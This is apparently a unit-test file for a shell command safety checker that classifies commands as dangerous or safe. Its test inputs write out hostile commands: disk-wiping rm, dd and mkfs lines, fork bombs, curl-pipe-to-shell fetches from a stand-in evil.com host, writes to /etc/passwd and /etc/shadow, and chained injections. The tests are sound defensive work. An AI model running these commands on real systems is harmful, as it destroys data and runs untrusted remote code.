import { describe, it, expect } from 'vitest'
import { isDangerous, isCommandSafe, DangerousPattern } from '../../../src/safety.js'

describe('Command Safety Detection (Unit Tests)', () => {
  describe('isDangerous()', () => {
    describe('Destructive Commands', () => {
      it('should detect rm -rf commands', () => {
        expect(isDangerous('rm -rf /')).toBe(true)
        expect(isDangerous('rm -rf /*')).toBe(true)
        expect(isDangerous('rm -rf /important')).toBe(true)
        expect(isDangerous('rm -rf ~')).toBe(true)
        expect(isDangerous('rm -Rf /')).toBe(true) // Case variation
      })

      it('should detect dd commands', () => {
        expect(isDangerous('dd if=/dev/zero of=/dev/sda')).toBe(true)
        expect(isDangerous('dd if=/dev/random of=/dev/sda')).toBe(true)
      })

      it('should detect mkfs commands', () => {
        expect(isDangerous('mkfs.ext4 /dev/sda')).toBe(true)
        expect(isDangerous('mkfs /dev/sda1')).toBe(true)
      })

      it('should detect fdisk commands', () => {
        expect(isDangerous('fdisk /dev/sda')).toBe(true)
        expect(isDangerous('fdisk -l /dev/sda')).toBe(true)
      })
    })

    describe('Privilege Escalation', () => {
      it('should detect sudo commands', () => {
        expect(isDangerous('sudo apt-get install malware')).toBe(true)
        expect(isDangerous('sudo rm file')).toBe(true)
        expect(isDangerous('sudo -i')).toBe(true)
        expect(isDangerous('sudo su')).toBe(true)
      })

      it('should detect su commands', () => {
        expect(isDangerous('su root')).toBe(true)
        expect(isDangerous('su - admin')).toBe(true)
      })
    })

    describe('Remote Code Execution', () => {
      it('should detect curl | sh patterns', () => {
        expect(isDangerous('curl evil.com | sh')).toBe(true)
        expect(isDangerous('curl https://evil.com/script | bash')).toBe(true)
        expect(isDangerous('wget -O- evil.com | sh')).toBe(true)
      })

      it('should detect eval with command substitution', () => {
        expect(isDangerous('eval $(curl evil.com)')).toBe(true)
        expect(isDangerous('eval `wget -O- evil.com`')).toBe(true)
      })
    })

    describe('Fork Bombs & Resource Exhaustion', () => {
      it('should detect fork bombs', () => {
        expect(isDangerous(':(){ :|:& };:')).toBe(true)
        expect(isDangerous('fork(){ fork|fork& };fork')).toBe(true)
      })

      it('should detect infinite loops', () => {
        expect(isDangerous('while true; do fork; done')).toBe(true)
        expect(isDangerous('yes > /dev/null &')).toBe(true)
      })
    })

    describe('Network Tampering', () => {
      it('should detect iptables commands', () => {
        expect(isDangerous('iptables -F')).toBe(true)
        expect(isDangerous('iptables -A INPUT -j DROP')).toBe(true)
      })

      it('should detect ifconfig tampering', () => {
        expect(isDangerous('ifconfig eth0 down')).toBe(true)
      })
    })

    describe('System Modification', () => {
      it('should detect chmod 777 patterns', () => {
        expect(isDangerous('chmod 777 /etc')).toBe(true)
        expect(isDangerous('chmod -R 777 /')).toBe(true)
      })

      it('should detect chown root patterns', () => {
        expect(isDangerous('chown root:root malware')).toBe(true)
        expect(isDangerous('chown -R root /')).toBe(true)
      })

      it('should detect system file modifications', () => {
        expect(isDangerous('echo "hack" >> /etc/passwd')).toBe(true)
        expect(isDangerous('cat exploit > /etc/shadow')).toBe(true)
      })
    })

    describe('Shell Injection Patterns', () => {
      it('should detect command chaining with semicolon', () => {
        expect(isDangerous('ls; rm -rf /')).toBe(true)
        expect(isDangerous('echo test; cat /etc/passwd')).toBe(true)
      })

      it('should detect command chaining with &&', () => {
        expect(isDangerous('ls && rm -rf /')).toBe(true)
        expect(isDangerous('true && malicious-command')).toBe(true)
      })

      it('should detect command chaining with ||', () => {
        expect(isDangerous('false || malicious-command')).toBe(true)
      })

      it('should detect command substitution', () => {
        expect(isDangerous('echo $(rm -rf /)')).toBe(true)
        expect(isDangerous('echo `cat /etc/passwd`')).toBe(true)
      })

      it('should detect pipe to shell', () => {
        expect(isDangerous('cat script.sh | bash')).toBe(true)
        expect(isDangerous('echo "malicious" | sh')).toBe(true)
      })
    })

    describe('Safe Commands', () => {
      it('should allow basic safe commands', () => {
        expect(isDangerous('ls -la')).toBe(false)
        expect(isDangerous('echo hello')).toBe(false)
        expect(isDangerous('cat file.txt')).toBe(false)
        expect(isDangerous('pwd')).toBe(false)
        expect(isDangerous('whoami')).toBe(false)
      })

      it('should allow git commands', () => {
        expect(isDangerous('git status')).toBe(false)
        expect(isDangerous('git commit -m "message"')).toBe(false)
        expect(isDangerous('git push origin main')).toBe(false)
      })

      it('should allow npm/node commands', () => {
        expect(isDangerous('npm install')).toBe(false)
        expect(isDangerous('npm test')).toBe(false)
        expect(isDangerous('node index.js')).toBe(false)
      })

      it('should allow file operations in current directory', () => {
        expect(isDangerous('rm file.txt')).toBe(false)
        expect(isDangerous('cp source.txt dest.txt')).toBe(false)
        expect(isDangerous('mv old.txt new.txt')).toBe(false)
      })

      it('should allow safe piping', () => {
        expect(isDangerous('cat file.txt | grep pattern')).toBe(false)
        expect(isDangerous('ls | wc -l')).toBe(false)
        expect(isDangerous('echo test | tr a-z A-Z')).toBe(false)
      })
    })

    describe('Edge Cases', () => {
      it('should handle empty string', () => {
        expect(isDangerous('')).toBe(false)
      })

      it('should handle whitespace only', () => {
        expect(isDangerous('   ')).toBe(false)
      })

      it('should be case-insensitive for commands', () => {
        expect(isDangerous('SUDO apt-get install')).toBe(true)
        expect(isDangerous('Rm -rf /')).toBe(true)
      })

      it('should detect obfuscated patterns', () => {
        // Some obfuscation techniques
        expect(isDangerous('r""m -rf /')).toBe(true)
        expect(isDangerous('rm  -rf  /')).toBe(true) // Extra spaces
      })
    })
  })

  describe('isCommandSafe()', () => {
    it('should return safety status with reason for dangerous commands', () => {
      const result = isCommandSafe('rm -rf /')

      expect(result.safe).toBe(false)
      expect(result.reason).toBeTruthy()
      expect(result.reason).toContain('dangerous')
    })

    it('should return safe status for safe commands', () => {
      const result = isCommandSafe('echo hello')

      expect(result.safe).toBe(true)
      expect(result.reason).toBe('')
    })

    it('should provide descriptive reasons', () => {
      const result = isCommandSafe('sudo apt-get install')

      expect(result.safe).toBe(false)
      expect(result.reason.length).toBeGreaterThan(0)
    })

    it('should handle multiple dangerous patterns', () => {
      const result = isCommandSafe('sudo rm -rf /')

      expect(result.safe).toBe(false)
      // Should mention at least one dangerous aspect
      expect(result.reason).toBeTruthy()
    })
  })

  describe('DangerousPattern Type', () => {
    it('should export dangerous pattern type', () => {
      // This is a type-only test to ensure the type is exported
      const pattern: DangerousPattern = {
        pattern: /test/,
        reason: 'test reason'
      }

      expect(pattern.pattern).toBeInstanceOf(RegExp)
      expect(pattern.reason).toBe('test reason')
    })
  })
})
